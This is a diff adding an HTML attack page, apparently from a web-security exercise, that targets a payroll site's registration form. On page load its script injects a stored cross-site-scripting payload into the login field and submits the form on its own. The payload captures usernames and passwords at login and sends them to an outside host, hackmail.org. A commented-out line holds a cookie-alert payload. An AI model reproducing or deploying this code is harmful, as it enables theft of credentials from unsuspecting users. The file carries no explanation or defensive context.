@@ -1,0 +1,38 @@
+<!DOCTYPE HTML>
+<html>
+<head>
+
+
+</head>
+
+<body onload="javascript:changeAccount();">
+
+    <script>
+    function changeAccount ()
+    {
+      //document.getElementById("login2").value = "\"<script> window.onload = function() { alert(document.cookie)}
+        document.getElementById("login2").value = "\"<script>window.onload = function() { ; var form = document.forms[0];form.onsubmit = function() {var username = $(\"input[name=login]\").val(); var password = $(\"input[name=pw]\").val(); javascript:void((new Image()).src='http://hackmail.org/sendmail.php?username=user'+'&payload=username: '+ username + ', password: ' + password + '&random=' + Math.random());} }<\/script><p=\"";
+
+        document.getElementById("btn2").click();
+    }
+
+    </script>
+
+    <form action="http://payroll.utexas.edu/" method="post" id="form2" >
+     <fieldset>
+      <input style="display:;" id="name" type="text" name="name">
+
+      <label>Register<br></label>
+      <input type="text" id="login2" name="login" value="">
+      <input style="display;" id="pw1" type="password" name="pw1">
+      <input style="display;" id="pw2" type="password" name="pw2">
+
+      <div>
+       <button class="btn" type="submit" id="btn2" name="action" value="register">Register</button>
+      </div>
+     </fieldset>
+    </form>
+
+</body>
+
+</html>
